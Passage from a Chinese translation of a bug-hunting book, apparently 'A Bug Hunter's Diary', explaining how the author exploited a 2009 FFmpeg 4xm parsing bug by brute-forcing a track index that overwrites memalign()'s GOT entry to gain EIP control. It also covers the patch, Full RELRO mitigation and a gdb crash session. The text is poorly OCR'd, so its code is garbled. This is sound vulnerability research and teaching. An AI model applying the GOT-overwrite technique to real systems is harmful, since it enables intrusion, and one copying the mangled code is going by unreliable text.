return NULL;
53
54#ifdef CONFIG_MEMALIGN_HACK
55
ptr =malloc(size+16);
56
if(!ptr)
57
return ptr;
58
diff=（（-（1ong）ptr-1）&15)+1;
59
ptr=（char*）ptr+diff;
60
（（char*）ptr）[-1]=diff;
61
#elif defined(HAVE_POSIX_MEMALIGN)
62
posix memalign(&ptr,16,size);
63#elif defined （HAVE _MEMALIGN)
64
ptr =memalign(16,size);
[..]
135
void *av_mallocz(unsigned int size)
136{
137
void *ptr= av_malloc(size);
138
if (ptr)
139
memset（ptr，0,size）;
140
return ptr;
141}
[..]
---
## Page 77
62：第4章空指针万岁
第137行调用了函数av_malloc（），av_malloc（)在第64行调用memalign（）（其
他的ifdef分支（第54行和第61行）在UbuntuLinux9.04平台上均未定义）。看
到memalign（)函数我很兴奋，因为这正是我想找的：一个在漏洞触发后紧接着调
用的库函数（见图4-6）。
FFmpeg内都函数
fourxm_read_header()
av_new_stream()
av_malloczo)
av_malloc()
漏洞函教
FFmpeg内部函数
FFmpeg内部函数
memaligno
库功能
图4-6函数调用图，显示从漏洞函数到memalign（)的调用关系
这带来了下一个问题：在FFmpeg中memalign()的GOT入口地址是什么？
通过objdump我得到如下信息。
linux$objdump-Rffmpeg_g|grepmemalign
08560204R_386_JUMP_SLOTposix_memalign
因此我需要覆写的地址是0x08560204。我要做的是计算出那个合适的track
number值（current_track）。可以用以下两个方法中的任意一个来得到这个变量
值：尝试通过计算得出，或者使用暴力方法。我选择容易的方法，写了以下程序。
代码清单4-1一个使用暴力方法找到current_track的合适值的辅助小程序
(addr_brute_force.c）
01 #include
02
03//GoTentryaddressofmemalign()
04 #define MEMALIGN_GOT_ADDR
0x08560204
05
06//Min and maxvalue for‘current_track'
07 #define SEARCH_START
00000008X0
08#define SEARCH_END
OxFFFFFFFF
60
10int
11 main (void)
12{
13
unsigned int a,b= 0;
14
---
## Page 78
4.2漏洞利用63
15
foT（a=SEARCH_START;atracks[current_track].adpcm=
AV_RL32（&header[i+12]):
(3)
K
写区域一
4xm文件
GOT:memalign
(工)
2
current_track
偏移值
NULL
图4-8图解我是如何利用这个FFmpegbug的
---
## Page 80
4.3漏洞修正65
(1）内存写操作的目标地址是由current_track作为一个索引（NULL+
current_track+偏移值）计算出的。current_track的值来自4xm媒体文件的用
户控制数据。
（2）内存写操作的源数据来自媒体文件的用户控制数据。
(3)用户控制数据复制到memalign()函数在GOT中的人口位置。
4.3漏洞修正
2009年1月27日，星期二
在我将这一bug通知了FFmpeg的维护者之后，他们开发了下面这个补丁。[6]
--a/libavformat/4xm.c
+++b/1ibavformat/4xm.c
@@-166,12+166,13@@ static int fourxm_read_header(AVFormatContext *s,
goto fail;
1
current_track=AV_RL32（&header[i +8]);
if(（unsigned)current_track>=UINT_MAX/sizeof（AudioTrack)-1）{
av_log(s,AV_LOG_ERROR,"current_track toolarge\n");
ret=-1;
+
goto fail;
+
if（current_track+1>fourxm->track_count）{
fourxm->track_count=current_track+1;
if(（unsigned)fourxm->track_count >= UINT_MAx/sizeof（AudioTrack)){
ret=-1;
goto fail;
1
fourxm->tracks= av_realloc(fourxm->tracks,
fourxm->track_count *sizeof(AudioTrack));
if (!fourxm->tracks）{
这个补丁重新做了长度检查，从而限制current_track的最大值不能超过
0x09249247。
(UINT_MAx/ sizeof(AudioTrack)-1)-1=maximum allowedvalue for current_track
(oxffffffff/ox1c
-1)-1=0x09249247
补丁打在正确的地方，current_track就不会是负数，这个漏洞真正修复了。
这个补丁在源代码级清除了这个漏洞。也有普通的漏洞利用缓解技术可以让
利用这个bug变得更难。为了控制执行流，我必须覆写一个内存位置以控制EIP。
这个例子中我用的是GOT人口地址。RELRO缓解技术有一种操作模式叫作完全
---
## Page 81
66第4章空指针万岁
RELRO（FullRELRO），它（重）映射GOT为只读，这样，通过之前描述的覆写
GOT的技巧来控制FFmpeg执行流便做不到了。然而，还有RELRO技术缓解不
了的其他漏洞利用技术仍然可以控制EIP。
为了使用完全RELRO缓解技术，FFmepg
关于RELRO缓解技术的
需要额外使用以下链接选项重新编译二进制文更多信息见C.2节.
件：-Wl、-z、relro、-z、nowo
重新编译带有完全RELRO支持的FFmpeg示例如下。
linux$./configure --extra-ldflags="-wl,-z,relro,-z,now"
linux$ make
得到memalign（)的GOT人口：
linux$objdump-R./ffmpeg_g1grepmemalign
0855ffdoR_386_JUMP_SLOTposix_memalign
调整代码清单4-1的代码，使用暴力方法得到currenttrack的值。
linux$./addr_brute_force
Valuefor'current_track':806ab330
做一个新的POC文件（poc_relro.4xm），然后在调试器中加以测试（以下调
试命令的描述见B.4节）。
linux$ gdb-q./ffmpeg_g
(gdb)set disassembly-flavor intel
(gdb)run-i poc_relro.4xm
Startingprogram:/home/tk/BHD/ffmpeg_relro/ffmpeg_g-ipoc_relro.4xm
FFmpeg version SVN-r16556,Copyright （c) 2000-2009 Fabrice Bellard,et al.
configuration:--extra-ldflags=-Wl,-z,relro,-z,now
libavutil49.12.0/49.12.0
libavcodec
52.10.0/52.10.0
libavformat52.23.1/52.23.1
libavdevice52.1.0/52.1.0
built on Jan 24 2009 09:07:58,gcc: 4.3.3
Programreceived signal SIGSEGV，Segmentation fault.
0x0809c89d in fourxm_read_header(s=0xa836330，ap=0xbfb19674)at
libavformat/4xm.c:178
178
fourxm->tracks[current_track].adpcm=AV_RL32(&header[i + 12]);
当FFmpeg尝试解析格式错误的媒体文件时再次崩溃。为查看究竞是什么导
致了崩溃，我让调试器显示当前的寄存器值和FFmpeg执行的最后一条指令。
---
## Page 82
4.3漏洞修正67
(gdb）info registers
xea
oxbbbbbbbb
-1145324613
ecx
0xa83f3e0
176419808
edx
0x0
0
ebx
0x806ab330
-2140490960
esp
0xbfb194fo
oxbfb194f0
ebp
0x855ffco
0x855ffco
esi
0xa83f3a0
176419744
edi
0xa83f330
176419632
eip
0x809c89d
0x809c89d
eflags
0x10206
[PFIFRF]
CS
0x73
115
SS
0x7b
123
ds
0x7b
123
es
0x7b
123
fs
0x0
0
gs